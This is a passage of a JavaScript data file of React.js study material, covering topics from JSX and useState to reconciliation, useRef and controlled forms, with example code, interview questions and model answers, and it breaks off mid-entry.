// React.js stack. Topics are auto-sorted Basic -> Intermediate -> Advanced by the registry.

const react = {
  name: 'React.js',
  intro: 'From JSX to rendering internals. Read the simple version first; the deeper version is what separates a 3-year engineer from a beginner.',
  topics: [
    {
      id: 'jsx-components-props',
      title: 'JSX, components, and props',
      level: 'basic',
      priority: 'must',
      frequency: 'very common',
      summary: 'Components are functions that return UI; props are the inputs you pass to them.',
      what: [
        "A component is a JavaScript function that returns what should appear on screen. JSX is the HTML-like syntax you write inside it. It isn't real HTML: a build tool turns it into plain JavaScript function calls.",
        "Props (short for properties) are the inputs to a component, like arguments to a function. A parent passes props down; the child reads them but must not change them.",
      ],
      deeper: [
        "`<Button label='Save' />` becomes roughly `jsx(Button, { label: 'Save' })`. That call returns a plain object (a React element) that describes the UI. React reads these objects to decide what to put in the real DOM.",
        "Because JSX is JavaScript, you use `className` instead of `class`, `{}` to insert any expression, and every element must be closed. A component must return one root element, or a Fragment `<>...</>` to group siblings without an extra div.",
      ],
      why: "Components let you build a big UI from small, reusable pieces. Props make those pieces configurable, so one `Button` component can serve every button in the app.",
      analogy: "A component is a cookie cutter; props are the decorations you choose for each cookie. Same shape, different toppings.",
      code: {
        lang: 'jsx',
        source: `function Greeting({ name, role = 'Engineer' }) { // destructure props, with a default
  return (
    <p className="greeting">
      Hello {name}, you are a {role}.
    </p>
  );
}

export default function App() {
  return (
    <>
      <Greeting name="Asha" role="Recruiter" />
      <Greeting name="Ravi" />
    </>
  );
}`,
      },
      output: "The page shows two lines: 'Hello Asha, you are a Recruiter.' and 'Hello Ravi, you are a Engineer.'. The second uses the default role because no role prop was passed.",
      questions: [
        { q: 'What is JSX?', a: 'A syntax that looks like HTML but compiles to JavaScript function calls that create React elements. Browsers never see JSX.' },
        { q: 'Can a child component change its props?', a: 'No. Props are read-only. If something needs to change, the parent owns it as state and passes down a function the child can call.' },
        { q: 'What is the `children` prop?', a: 'Whatever you put between a component\'s opening and closing tags. `<Card><p>Hi</p></Card>` gives Card a `children` prop containing the paragraph.' },
        { q: 'Why must components start with a capital letter?', a: 'JSX treats lowercase tags as HTML elements (`div`) and capitalized ones as components (`Div`).' },
      ],
      answer30: "A React component is a function that returns JSX, which describes the UI. JSX looks like HTML but compiles to JavaScript calls that create plain objects called React elements. Props are the component's inputs, passed from parent to child, and they're read-only. If a child needs to change something, the parent keeps it in state and passes a callback down. This one-way data flow makes apps easier to reason about.",
      mistakes: [
        'Mutating props, like `props.items.push(x)`. It changes the parent\'s data behind React\'s back.',
        "Writing `class` instead of `className`, or `onclick` instead of `onClick`.",
        "Rendering `{count && <List />}` when count can be 0. React renders the `0`. Use `{count > 0 && <List />}`.",
        "Trap: 'Is JSX required?' No, it's syntax sugar. You could call React's functions directly, but nobody does.",
      ],
      takeaway: 'Components are functions, JSX describes UI, props flow down and are read-only.',
    },

    {
      id: 'state-usestate',
      title: 'State and useState',
      level: 'basic',
      priority: 'must',
      frequency: 'very common',
      summary: "State is a component's memory; changing it with the setter makes React re-render.",
      what: [
        "State is data that a component remembers between renders and that can change, like a counter value or form input. `useState` gives you the current value and a setter function.",
        "When you call the setter, React schedules a re-render, and the component function runs again with the new value.",
      ],
      deeper: [
        "State updates are not instant. Inside an event handler, `count` keeps its old value until the next render. That's because each render has its own fixed snapshot of state.",
        "If the new value depends on the old one, pass a function: `setCount(c => c + 1)`. React gives you the latest value even when several updates are queued. React also batches several setter calls in the same event into one re-render.",
        "State must be treated as immutable. For objects and arrays, create a new copy instead of changing the old one, because React compares by reference (`Object.is`) to decide whether anything changed.",
      ],
      why: "Normal variables reset every time the function runs and changing them doesn't update the screen. State survives re-renders and tells React when to update the UI.",
      analogy: "State is a whiteboard in a meeting room. Each render is a photo of the whiteboard. Writing on the whiteboard (the setter) doesn't change old photos; it leads to a new photo.",
      code: {
        lang: 'jsx',
        source: `import { useState } from 'react';

export default function Counter() {
  const [count, setCount] = useState(0);
  const [user, setUser] = useState({ name: 'Asha', likes: 0 });

  function addThree() {
    // Wrong: all three read the same snapshot, so count only goes up by 1
    // setCount(count + 1); setCount(count + 1); setCount(count + 1);

    // Right: the updater function always gets the latest value
    setCount((c) => c + 1);
    setCount((c) => c + 1);
    setCount((c) => c + 1);
  }

  function like() {
    setUser((u) => ({ ...u, likes: u.likes + 1 })); // new object, not mutation
  }

  return (
    <div>
      <p>Count: {count}</p>
      <button onClick={addThree}>+3</button>
      <p>{user.name} has {user.likes} likes</p>
      <button onClick={like}>Like</button>
    </div>
  );
}`,
      },
      output: "Clicking '+3' raises the count by 3 with one re-render, because the three updates are batched and each updater gets the latest value. Clicking 'Like' creates a new user object, so React sees a change and re-renders.",
      questions: [
        { q: 'Why does `console.log(count)` right after `setCount` show the old value?', a: 'Because state is a snapshot for this render. The setter schedules a new render; the current function keeps the old value.' },
        { q: 'When should you use the updater form `setX(prev => ...)`?', a: 'Whenever the new value depends on the previous one, especially with several updates in a row or inside async code and timers.' },
        { q: 'Why not mutate state directly?', a: 'React compares the old and new values by reference. If you mutate the same object, the reference is unchanged, so React may skip the re-render.' },
        { q: 'What is lazy initial state?', a: '`useState(() => expensive())` runs the function only on the first render. `useState(expensive())` would call it on every render and throw the result away.' },
      ],
      answer30: "useState gives a component memory that survives re-renders. Calling the setter schedules a re-render; it doesn't change the value in the current render, because each render sees a snapshot. When the next value depends on the previous one, I use the updater form, like setCount(c => c + 1). And I never mutate objects or arrays in state; I create new copies, because React compares by reference to detect changes.",
      mistakes: [
        'Reading state right after setting it and expecting the new value.',
        '`state.items.push(x); setItems(state.items)`: same reference, so React may not re-render.',
        'Storing values that can be calculated from other state or props. Compute them during render instead.',
        "Trap: 'Does setState with the same value re-render?' React bails out if the new value is identical by Object.is, though it may still render the component once before bailing out.",
      ],
      takeaway: 'State is a per-render snapshot; update immutably, and use the updater form when the next value depends on the last.',
    },

    {
      id: 'lists-and-keys',
      title: 'Lists and keys',
      level: 'basic',
      priority: 'must',
      frequency: 'very common',
      summary: 'Keys tell React which list item is which between renders, so it updates the right ones.',
      what: [
        "To show a list, you `map` an array to JSX elements. Each element needs a `key` prop, a value that is unique among its siblings and stays the same for the same item.",
      ],
      deeper: [
        "When a list re-renders, React matches old and new children by key. Same key means 'same item, maybe updated'. New key means 'create it'. Missing key means 'remove it'.",
        "If you use the array index as the key and the list is reordered, filtered, or has items inserted at the top, React matches the wrong items. Component state (like typed text in an input) then sticks to the wrong row. Use a stable id from your data. Index is only safe for static lists that never reorder.",
      ],
      why: "Without good keys, React either rebuilds more DOM than needed (slow) or reuses the wrong elements (bugs in inputs, animations, and focus).",
      analogy: "Name tags at a conference. If people swap seats, name tags let you find the same person. Seat numbers (indexes) would make you greet the wrong person.",
      code: {
        lang: 'jsx',
        source: `import { useState } from 'react';

export default function Todos() {
  const [todos, setTodos] = useState([
    { id: 'a1', text: 'Read about keys' },
    { id: 'b2', text: 'Practise closures' },
  ]);

  function addToTop() {
    const id = crypto.randomUUID();
    setTodos((t) => [{ id, text: 'New task' }, ...t]);
  }

  return (
    <>
      <button onClick={addToTop}>Add to top</button>
      <ul>
        {todos.map((todo) => (
          // Stable id as key. Try key={index} and type in an input to see the bug.
          <li key={todo.id}>
            {todo.text} <input placeholder="notes" />
          </li>
        ))}
      </ul>
    </>
  );
}`,
      },
      output: "Type 'hello' into the first row's input, then click 'Add to top'. With `key={todo.id}`, 'hello' stays next to 'Read about keys'. With `key={index}`, 'hello' jumps to the new row, because React thinks index 0 is still the same item.",
      questions: [
        { q: 'Why does React need keys?', a: 'To match list items between renders, so it can update, move, add, or remove the right DOM nodes and keep each item\'s state attached to it.' },
        { q: 'When is using the index as key okay?', a: 'Only for static lists that are never reordered, filtered, or inserted into.' },
        { q: 'Should keys be unique globally?', a: 'No, only among siblings in the same list.' },
        { q: 'Can I generate keys with Math.random() during render?', a: 'No. A new key every render makes React destroy and recreate every item each time, losing state and wasting work.' },
      ],
      answer30: "Keys let React match list items between renders. Same key means same item, so React keeps its DOM node and state and only updates what changed. I use stable ids from the data. Using the array index breaks when items are inserted, removed, or reordered, because state ends up attached to the wrong row. Random keys are even worse, since every item is recreated on each render.",
      mistakes: ['Index as key on dynamic lists.', 'Random or Date-based keys generated during render.', 'Putting the key on the wrong element: it goes on the outermost element returned from map.', "Trap: 'Can you read `props.key` inside the child?' No, key is used by React and not passed as a prop. Pass the id separately if the child needs it."],
      takeaway: 'Use a stable, unique id as the key; index keys break on reorder and insert.',
    },

    {
      id: 'useeffect',
      title: 'useEffect',
      level: 'intermediate',
      priority: 'must',
      frequency: 'very common',
      summary: 'Runs code after render to sync with things outside React, and cleans up after itself.',
      what: [
        "`useEffect` runs a function after React has updated the screen. You use it to connect to things outside React: fetching data, subscriptions, timers, or browser APIs.",
        "The dependency array controls when it runs again. Empty `[]` means only after the first render. `[id]` means after the first render and whenever `id` changes. No array means after every render.",
      ],
      deeper: [
        "The function you return is the cleanup. React runs it before the effect runs again, and when the component unmounts. That's where you clear timers, unsubscribe, and cancel requests.",
        "In development with StrictMode, React 18+ mounts, unmounts, and remounts components once, so effects run, clean up, and run again. This is on purpose: it reveals effects that don't clean up properly. It doesn't happen in production.",
        "Many effects aren't needed. If you're just computing a value from props or state, compute it during render. If something happens because the user clicked, put it in the event handler.",
      ],
      why: "Render must be pure: same inputs, same JSX, no side effects. Effects give you a controlled place to do side effects after rendering, with a clear way to undo them.",
      analogy: "Moving into a hotel room: when you arrive (mount), you plug in your charger (effect). When you change rooms (dependency change) or check out (unmount), you unplug it (cleanup) before plugging into the next socket.",
      code: {
        lang: 'jsx',
        source: `import { useEffect, useState } from 'react';

function UserProfile({ userId }) {
  const [user, setUser] = useState(null);
  const [error, setError] = useState(null);

  useEffect(() => {
    const controller = new AbortController(); // lets us cancel the request

    setUser(null);
    fetch(\`https://jsonplaceholder.typicode.com/users/\${userId}\`, { signal: controller.signal })
      .then((r) => {
        if (!r.ok) throw new Error('HTTP ' + r.status);
        return r.json();
      })
      .then(setUser)
      .catch((err) => {
        if (err.name !== 'AbortError') setError(err.message);
      });

    // Cleanup: if userId changes before the response arrives, cancel the old request
    return () => controller.abort();
  }, [userId]);

  if (error) return <p>Could not load the user: {error}</p>;
  return <p>{user ? user.name : 'Loading...'}</p>;
}`,
      },
      output: "When userId is 1, the effect fetches user 1. If the user quickly switches to 2, the cleanup aborts request 1 before request 2 starts, so a slow response for user 1 can never overwrite user 2's data. This is how you avoid race conditions in effects.",
      questions: [
        { q: 'What does the dependency array do?', a: 'It tells React when to re-run the effect: only when one of the listed values changed since the last render (compared with Object.is).' },
        { q: 'When does cleanup run?', a: 'Before the effect runs again because a dependency changed, and when the component unmounts.' },
        { q: 'Why does my effect run twice in development?', a: 'React StrictMode intentionally mounts, unmounts, and remounts in development to expose missing cleanup. It doesn\'t happen in production.' },
        { q: 'Why can\'t the effect function itself be async?', a: 'An async function returns a promise, but React expects the effect to return nothing or a cleanup function. Define an async function inside and call it.' },
        { q: 'useEffect vs useLayoutEffect?', a: 'useEffect runs after the browser paints. useLayoutEffect runs after DOM changes but before paint, for measuring layout without flicker. Prefer useEffect.' },
      ],
      answer30: "useEffect lets a component sync with something outside React, like a network request, subscription, or timer, after render. The dependency array decides when it re-runs, and the returned cleanup runs before the next run and on unmount. For data fetching I use an AbortController in the cleanup so a slow old response can't overwrite new data. And I avoid effects for things that can be computed during render or handled in an event handler.",
      mistakes: [
        'Missing dependencies, which causes stale values. Follow the eslint react-hooks rule.',
        'Setting state in an effect that depends on that same state with no condition: infinite loop.',
        'Objects or functions created during render as dependencies: they are new every render, so the effect runs every time.',
        'Forgetting cleanup for intervals, listeners, and subscriptions, causing memory leaks.',
        "Trap: 'How do you fetch data in a real app?' Mention that libraries like TanStack Query handle caching, retries, and race conditions, and frameworks like Next.js fetch on the server.",
      ],
      takeaway: 'Effects sync with the outside world after render; always list dependencies and clean up.',
    },

    {
      id: 'context-api',
      title: 'Context API',
      level: 'intermediate',
      priority: 'must',
      frequency: 'very common',
      summary: 'Share a value with any component below a provider without passing props through every level.',
      what: [
        "Context lets a parent make a value available to all components inside it, at any depth, without passing props through each level. Common uses: current user, theme, language.",
        "Passing props through many components that don't need them is called prop drilling. Context solves that.",
      ],
      deeper: [
        "When the provider's `value` changes, every component that reads that context re-renders. If you write `value={{ user, setUser }}`, that object is new on every render of the provider, so all consumers re-render even if nothing changed. Wrap it in `useMemo`, or split into separate contexts for things that change at different speeds.",
        "Context is a way to pass data, not a full state manager. For frequently changing, complex shared state, tools like Redux Toolkit or Zustand give you selectors so components only re-render for the slice they use.",
      ],
      why: "Without context, global-ish data has to be passed through every layer, which makes components cluttered and hard to move around.",
      analogy: "Wi-Fi in a house. Instead of running a cable to every room (prop drilling), you put a router in the house (provider) and any device in range (consumer) can connect.",
      code: {
        lang: 'jsx',
        source: `import { createContext, useContext, useMemo, useState } from 'react';

const AuthContext = createContext(null);

export function AuthProvider({ children }) {
  const [user, setUser] = useState(null);
  // useMemo: same object between renders unless user changes
  const value = useMemo(() => ({ user, login: setUser, logout: () => setUser(null) }), [user]);
  return <AuthContext.Provider value={value}>{children}</AuthContext.Provider>;
}

export function useAuth() {
  const ctx = useContext(AuthContext);
  if (!ctx) throw new Error('useAuth must be used inside AuthProvider');
  return ctx;
}

function Navbar() {
  const { user, logout } = useAuth(); // no props needed
  return user ? <button onClick={logout}>Log out {user.name}</button> : <span>Guest</span>;
}

export default function App() {
  return (
    <AuthProvider>
      <Navbar />
    </AuthProvider>
  );
}`,
      },
      output: "Navbar reads the user directly from context. At first it shows 'Guest'. When some component calls `login({ name: 'Asha' })`, the context value changes, Navbar re-renders, and shows a 'Log out Asha' button.",
      questions: [
        { q: 'What problem does Context solve?', a: 'Prop drilling: passing data through many components that don\'t use it, just to reach a deep child.' },
        { q: 'Does Context replace Redux?', a: 'For small, rarely changing global data, yes. For large, frequently updated state with many consumers, Redux Toolkit or Zustand give better performance through selectors, plus devtools and middleware.' },
        { q: 'Why are all my consumers re-rendering?', a: 'The provider\'s value is probably a new object each render. Memoize it, or split the context.' },
        { q: 'What happens if there\'s no provider?', a: 'useContext returns the default value from createContext. A custom hook that throws makes the mistake obvious.' },
      ],
      answer30: "Context lets me share data like the current user or theme with any component below a provider, without prop drilling. Every component that reads the context re-renders when the provider's value changes, so I memoize the value and split contexts that change at different rates. I wrap it in a custom hook like useAuth that throws if there's no provider. For large, fast-changing global state, I'd use Redux Toolkit or Zustand instead.",
      mistakes: ['Passing a new object as value on every render.', 'Putting everything in one giant context, so any change re-renders the whole app.', 'Using context for state that only two nearby components share. Lift state up instead.', "Trap: 'Does React.memo stop context re-renders?' No. A memoized component that reads the context still re-renders when the context changes."],
      takeaway: 'Context removes prop drilling; memoize the value and split contexts to control re-renders.',
    },

    {
      id: 'custom-hooks',
      title: 'Custom hooks',
      level: 'intermediate',
      priority: 'must',
      frequency: 'common',
      summary: 'Functions starting with `use` that bundle stateful logic so many components can reuse it.',
      what: [
        "A custom hook is a normal function whose name starts with `use` and which calls other hooks. It lets you move stateful logic out of a component and reuse it.",
        "Each component that calls a custom hook gets its own separate state. Hooks share logic, not state.",
      ],
      deeper: [
        "The rules of hooks apply: call hooks only at the top level of components or other hooks, never inside conditions or loops. React tracks hooks by their call order, so the order must be the same on every render.",
      ],
      why: "Without custom hooks, the same fetch-loading-error logic or debounce logic gets copied into many components. A hook gives one tested place for it.",
      analogy: "A recipe card. Many cooks can follow the same recipe, but each cooks their own dish in their own pan.",
      code: {
        lang: 'jsx',
        source: `import { useEffect, useState } from 'react';

// Reusable: returns a value that only updates after the user stops typing
export function useDebounce(value, delay = 400) {
  const [debounced, setDebounced] = useState(value);
  useEffect(() => {
    const id = setTimeout(() => setDebounced(value), delay);
    return () => clearTimeout(id); // typing again cancels the previous timer
  }, [value, delay]);
  return debounced;
}

export default function Search() {
  const [text, setText] = useState('');
  const query = useDebounce(text, 500);

  useEffect(() => {
    if (query) console.log('Searching for', query); // call the API here
  }, [query]);

  return <input value={text} onChange={(e) => setText(e.target.value)} placeholder="Search" />;
}`,
      },
      output: "Typing 'react' quickly updates `text` five times, but `query` changes only once, 500 ms after the last key press. So the search runs once instead of five times.",
      questions: [
        { q: 'Do two components using the same hook share state?', a: 'No. Each call has its own state. To share state, put it in a common parent or in context.' },
        { q: 'Why must hook names start with `use`?', a: 'So React\'s lint rules can check the rules of hooks inside them, and so readers know hook rules apply.' },
        { q: 'Why can\'t hooks be called inside an if?', a: 'React identifies hooks by their call order. A condition could change the order between renders and mix up their state.' },
      ],
      answer30: "A custom hook is a function starting with 'use' that calls other hooks, so I can reuse stateful logic like debouncing, fetching, or form handling across components. Each component that uses it gets its own independent state; hooks share logic, not data. They follow the rules of hooks: only at the top level, never in conditions, because React tracks hooks by call order.",
      mistakes: ['Expecting a custom hook to share state between components.', 'Calling hooks conditionally inside the custom hook.', 'Returning new objects or functions each render that callers then use as effect dependencies, causing extra effect runs. Memoize them if needed.'],
      takeaway: 'Custom hooks reuse logic, not state, and follow the rules of hooks.',
    },

    {
      id: 'memo-usememo-usecallback',
      title: 'React.memo, useMemo, and useCallback',
      level: 'intermediate',
      priority: 'must',
      frequency: 'very common',
      summary: 'Tools to skip unnecessary work: memo skips re-rendering a component, useMemo caches a value, useCallback caches a function.',
      what: [
        "`React.memo(Component)` skips re-rendering a component if its props are the same as last time. `useMemo(fn, deps)` remembers the result of a calculation. `useCallback(fn, deps)` remembers a function so it's the same function between renders.",
      ],
      deeper: [
        "Why `useCallback` matters: functions created during render are new every time. If you pass a new function to a `React.memo` child, its props changed by reference, so memo is useless. `useCallback` keeps the same reference, so memo works.",
        "These tools cost something too: memory and a dependency comparison every render. Use them when you measured a slow render, when a value is expensive to compute, or when a stable reference is needed (memo children, effect dependencies). Wrapping everything is noise. Note: the React Compiler (released after React 19) can add this memoization automatically; check its current status before relying on it.",
      ],
      why: "When a parent re-renders, all its children re-render by default, even if nothing they use changed. In big lists or heavy components, that wasted work makes the UI feel slow.",
      analogy: "A student who writes answers to hard maths problems in a notebook. If the same question comes again (same dependencies), they read the answer instead of solving it again.",
      code: {
        lang: 'jsx',
        source: `import { memo, useCallback, useMemo, useState } from 'react';

const Row = memo(function Row({ item, onSelect }) {
  console.log('render row', item.id);
  return <li onClick={() => onSelect(item.id)}>{item.name}</li>;
});

export default function List({ items }) {
  const [query, setQuery] = useState('');
  const [selected, setSelected] = useState(null);

  // Recalculate only when items or query change
  const visible = useMemo(
    () => items.filter((i) => i.name.toLowerCase().includes(query.toLowerCase())),
    [items, query]
  );

  // Same function every render, so memo(Row) can skip re-rendering
  const onSelect = useCallback((id) => setSelected(id), []);

  return (
    <>
      <input value={query} onChange={(e) => setQuery(e.target.value)} />
      <p>Selected: {selected}</p>
      <ul>{visible.map((item) => <Row key={item.id} item={item} onSelect={onSelect} />)}</ul>
    </>
  );
}`,
      },
      output: "Clicking a row updates `selected`, so List re-renders. Without useCallback, `onSelect` would be a new function and every Row would log 'render row'. With it, Rows get the same props and memo skips them. Typing in the search box recalculates `visible`, and only rows whose props changed re-render.",
      questions: [
        { q: 'Difference between useMemo and useCallback?', a: 'useMemo caches the result of calling a function. useCallback caches the function itself. `useCallback(fn, deps)` is the same as `useMemo(() => fn, deps)`.' },
        { q: 'When does React.memo not help?', a: 'When props change every render anyway, like inline objects, arrays, or functions, or when the component reads a context that changed.' },
        { q: 'Should you wrap everything in useMemo?', a: 'No. It adds complexity and a small cost. Use it for expensive calculations or when a stable reference is needed. Measure with React DevTools Profiler first.' },
        { q: 'Does React.memo do a deep comparison?', a: 'No, a shallow comparison of each prop with Object.is. You can pass a custom compare function as the second argument.' },
      ],
      answer30: "By default, when a parent re-renders, all its children re-render. React.memo skips a child if its props are shallowly equal. useMemo caches an expensive computed value, and useCallback keeps a function's reference stable, which matters when passing callbacks to memoized children or using them as effect dependencies. I don't wrap everything: I profile first with React DevTools and memoize where it actually saves work.",
      mistakes: ['Using React.memo but passing inline objects or arrow functions as props.', 'Missing dependencies in useMemo/useCallback, which returns stale values.', 'Memoizing cheap things like `a + b`.', "Trap: 'Is useMemo a guarantee?' React's docs say it's a performance hint; React may discard the cache in some cases, so code must still work without it."],
      takeaway: 'memo skips renders, useMemo caches values, useCallback stabilizes functions; measure before using them.',
    },

    {
      id: 'virtual-dom-reconciliation',
      title: 'Virtual DOM, reconciliation, and what causes re-renders',
      level: 'advanced',
      priority: 'must',
      frequency: 'very common',
      summary: 'React builds a tree of plain objects, compares it with the last one, and changes only the real DOM nodes that differ.',
      what: [
        "The virtual DOM is a lightweight copy of the UI made of plain JavaScript objects. When state changes, React builds a new virtual tree, compares it with the previous one, and applies only the differences to the real DOM. That comparison is called reconciliation, or diffing.",
        "A component re-renders when: its own state changes, its parent re-renders, or a context it reads changes. Props changing is not a separate cause; props change because the parent re-rendered.",
      ],
      deeper: [
        "Comparing two trees perfectly is very slow, so React uses two shortcuts. (1) If an element's type changes (div to span, or ComponentA to ComponentB), React throws away that whole subtree and builds it fresh, losing state. (2) For lists, keys tell React which children match.",
        "Render and commit are separate phases. Render calls your components and diffs; it can be paused in concurrent rendering. Commit applies the DOM changes all at once and runs effects. Fiber is React's internal structure that makes this pausable work possible.",
        "A re-render doesn't mean the DOM changed. If the output is the same, React commits nothing.",
      ],
      why: "Touching the real DOM is relatively expensive. Reconciliation lets you write UI as 'what it should look like now' while React figures out the minimum changes needed.",
      analogy: "Spot the difference. React has yesterday's picture and today's picture, finds only the differences, and repaints just those spots instead of repainting the whole wall.",
      code: {
        lang: 'jsx',
        source: `import { useState } from 'react';

function Child({ label }) {
  console.log('Child rendered:', label);
  return <p>{label}</p>;
}

export default function Parent() {
  const [count, setCount] = useState(0);
  const [isAdmin, setIsAdmin] = useState(false);

  return (
    <div>
      <button onClick={() => setCount(count + 1)}>Count {count}</button>
      {/* Re-renders whenever Parent does, even though its prop never changes */}
      <Child label="static" />

      {/* Changing element TYPE resets state of everything inside */}
      <button onClick={() => setIsAdmin(!isAdmin)}>Toggle</button>
      {isAdmin ? <section><input placeholder="type here" /></section>
               : <div><input placeholder="type here" /></div>}
    </div>
  );
}`,
      },
      output: "Each click on 'Count' logs 'Child rendered: static', because a parent re-render re-renders children. But React's diff finds the text didn't change, so the real DOM `<p>` isn't touched. Type in the input, then press Toggle: the text disappears, because the wrapper changed from div to section, so React rebuilt that subtree.",
      questions: [
        { q: 'Is the virtual DOM faster than the real DOM?', a: 'Not by itself. It\'s a way to batch and minimize real DOM updates while letting you write declarative code. Hand-written DOM updates can be faster but are much harder to maintain.' },
        { q: 'What triggers a re-render?', a: 'A state change in the component, its parent re-rendering, or a change in a context it consumes.' },
        { q: 'What is the difference between render and commit?', a: 'Render calls components and calculates changes; it has no side effects and can be interrupted. Commit applies changes to the DOM and runs layout effects and effects.' },
        { q: 'What is Fiber?', a: 'React\'s internal reimplementation of reconciliation (since React 16). Each component is a unit of work, so React can pause, prioritize, and resume rendering. That enables concurrent features like useTransition.' },
      ],
      answer30: "React keeps a virtual DOM, a tree of plain objects describing the UI. On a state change it builds a new tree, diffs it against the previous one, and commits only the differences to the real DOM. The diff uses two shortcuts: a changed element type rebuilds that subtree, and keys match list items. A component re-renders when its state changes, its parent re-renders, or its context changes, but a re-render only touches the DOM if the output differs.",
      mistakes: ['Saying props changing causes re-renders on its own. It\'s the parent re-rendering.', 'Defining a component inside another component: it gets a new type every render, so its subtree and state are rebuilt each time.', "Trap: 'Is a re-render always bad?' No. Most are cheap. Optimize only slow ones you've measured."],
      takeaway: 'React diffs virtual trees and commits only the differences; type changes reset subtrees, keys match lists.',
    },

    {
      id: 'use-ref',
      title: 'useRef',
      level: 'basic',
      priority: 'must',
      frequency: 'very common',
      summary: 'A box that keeps a value between renders without causing a re-render; also how you reach a DOM node.',
      what: [
        "`useRef(initial)` returns an object `{ current: initial }`. React gives you the same object on every render, so whatever you put in `.current` survives re-renders.",
        "It has two jobs. (1) Point at a DOM element: pass the ref as `ref={inputRef}` and React fills `inputRef.current` with the real `<input>`, so you can call `.focus()`. (2) Store a value that must not trigger a re-render, like a timer id or the previous value of a prop.",
      ],
      deeper: [
        "Changing `ref.current` does not re-render. That is the big difference from state. If the screen should show the value, it belongs in state. If only your code needs it (timer ids, latest callback, a flag like 'is mounted'), a ref is right.",
        "Don't read or write `ref.current` during render (except lazy initialisation). Render should be pure; refs are for event handlers and effects. DOM refs are `null` during the first render and are set before effects run.",
        "Refs are also the standard fix for stale closures: an interval or listener can read `latestRef.current` and always see the newest value.",
      ],
      why: "Some values must persist across renders but should not cause one: a timer id, a WebSocket instance, a DOM node to focus. A normal variable resets on every render; state would cause pointless re-renders.",
      analogy: "A sticky note on the side of your monitor. You can change what is written on it any time, and nobody gets called into a meeting (no re-render) when you do.",
      code: {
        lang: 'jsx',
        source: `import { useEffect, useRef, useState } from 'react';

export default function Stopwatch() {
  const [seconds, setSeconds] = useState(0);
  const intervalRef = useRef(null); // value box: survives renders, no re-render on change
  const inputRef = useRef(null);    // DOM box: React puts the <input> here

  useEffect(() => {
    inputRef.current.focus(); // DOM node is ready by the time effects run
    return () => clearInterval(intervalRef.current);
  }, []);

  function start() {
    if (intervalRef.current) return; // already running
    intervalRef.current = setInterval(() => setSeconds((s) => s + 1), 1000);
  }

  function stop() {
    clearInterval(intervalRef.current);
    intervalRef.current = null;
  }

  return (
    <div>
      <input ref={inputRef} placeholder="Lap name" />
      <p>{seconds}s</p>
      <button onClick={start}>Start</button>
      <button onClick={stop}>Stop</button>
    </div>
  );
}`,
      },
      output: "The input is focused as soon as the page loads. Start begins counting every second; the interval id lives in a ref, so storing it causes no extra render. Clicking Start twice does nothing the second time, and Stop clears the same interval.",
      questions: [
        { q: "What is the difference between useRef and useState?", a: "Both keep a value between renders. Changing state triggers a re-render; changing `ref.current` does not. Use state for what the user sees and a ref for values only your code needs." },
        { q: "How do you focus an input on mount?", a: "Create `const ref = useRef(null)`, attach it with `<input ref={ref} />`, and call `ref.current.focus()` inside a `useEffect`. The input also has an `autoFocus` attribute for the simple case." },
        { q: "Why is `ref.current` null in my first render?", a: "React attaches DOM refs during the commit phase, after rendering. Read DOM refs in effects or event handlers, not in the component body." },
        { q: "How would you store the previous value of a prop?", a: "Keep it in a ref and update it in an effect after each render: the ref then holds last render's value while the current render reads the new prop. React docs also suggest storing it in state and comparing during render for some cases." },
      ],
      answer30: "useRef gives me a mutable object whose `.current` persists for the life of the component, and changing it doesn't re-render. I use it in two ways: to get a DOM node, for things like focusing an input or measuring size, and to store instance values like timer ids, a WebSocket, or the latest callback to avoid stale closures. If the value affects what's on screen, it belongs in state instead.",
      mistakes: [
        "Storing UI data in a ref and wondering why the screen doesn't update.",
        "Reading or writing `ref.current` during render, which makes the component impure and unpredictable.",
        "Using a ref to a DOM node to change content (`ref.current.innerText = ...`) that React also controls. React will overwrite it.",
        "Trap: 'Can you pass a ref to your own component?' Before React 19 you needed `forwardRef`. In React 19, function components receive `ref` as a normal prop.",
      ],
      takeaway: "Refs persist without re-rendering: use them for DOM nodes and behind-the-scenes values, state for anything visible.",
    },

    {
      id: 'forms-controlled-uncontrolled',
      title: 'Forms: controlled vs uncontrolled inputs',
      level: 'basic',
      priority: 'must',
      frequency: 'very common',
      summary: 'Controlled inputs keep their value in React state; uncontrolled inputs keep it in the DOM and you read it when needed.',
      what: [
        "A **controlled** input gets its value from state (`value={name}`) and reports every change with `onChange`. React is the single source of truth, so you can validate, format, or disable a button as the user types.",
        "An **uncontrolled** input keeps its own value inside the DOM. You give it a `defaultValue` and read the value later, with a ref or from the form's `FormData` on submit.",
      ],
      deeper: [
        "Controlled inputs re-render the component on every keystroke. For small forms that's fine. For big forms it can get slow, which is why libraries like react-hook-form use uncontrolled inputs plus refs.",
        "A classic warning: 'A component is changing an uncontrolled input to be controlled'. It happens when `value` starts as `undefined` (uncontrolled) and later becomes a string. Always initialise to `''`.",
        "`<input type='file'>` is always uncontrolled, because its value can only be set by the user. In React 19, a `<form action={fn}>` hands your function the `FormData`, which makes uncontrolled forms simpler again.",
      ],
      why: "Forms are in almost every app. Choosing between controlled and uncontrolled decides how easy validation is, how many re-renders happen, and how much code you write.",
      analogy: "Controlled is a receptionist writing down every word you say as you say it. Uncontrolled is handing in a filled-in paper form at the end, and the receptionist reads it once.",
      code: {
        lang: 'jsx',
        source: `import { useState } from 'react';

// Controlled: React state owns the value
export function SignupForm() {
  const [email, setEmail] = useState(''); // start with '' not undefined
  const isValid = email.includes('@');

  function handleSubmit(e) {
    e.preventDefault(); // stop the browser's full page reload
    console.log('Sending', email);
  }

  return (
    <form onSubmit={handleSubmit}>
      <input value={email} onChange={(e) => setEmail(e.target.value.trim())} />
      {!isValid && email && <p>Enter a valid email</p>}
      <button disabled={!isValid}>Sign up</button>
    </form>
  );
}

// Uncontrolled: the DOM owns the value, read it on submit
export function FeedbackForm() {
  function handleSubmit(e) {
    e.preventDefault();
    const data = new FormData(e.currentTarget);
    console.log(Object.fromEntries(data)); // { name: '...', message: '...' }
  }

  return (
    <form onSubmit={handleSubmit}>
      <input name="name" defaultValue="Guest" />
      <textarea name="message" />
      <button>Send</button>
    </form>
  );
}`,
      },
      output: "In SignupForm the button stays disabled until the text contains '@', and the error shows live while typing. Spaces are trimmed instantly because state controls the value. FeedbackForm doesn't re-render while typing; on submit it logs an object like `{ name: 'Guest', message: 'Great app' }`.",
      questions: [
        { q: "What is a controlled component?", a: "An input whose value comes from React state and changes only through `onChange` updating that state. React is the single source of truth for the value." },
        { q: "When would you choose uncontrolled inputs?", a: "For simple forms where you only need values on submit, for file inputs, for integrating non-React widgets, or for large forms where re-rendering on every keystroke is costly. react-hook-form is built on this idea." },
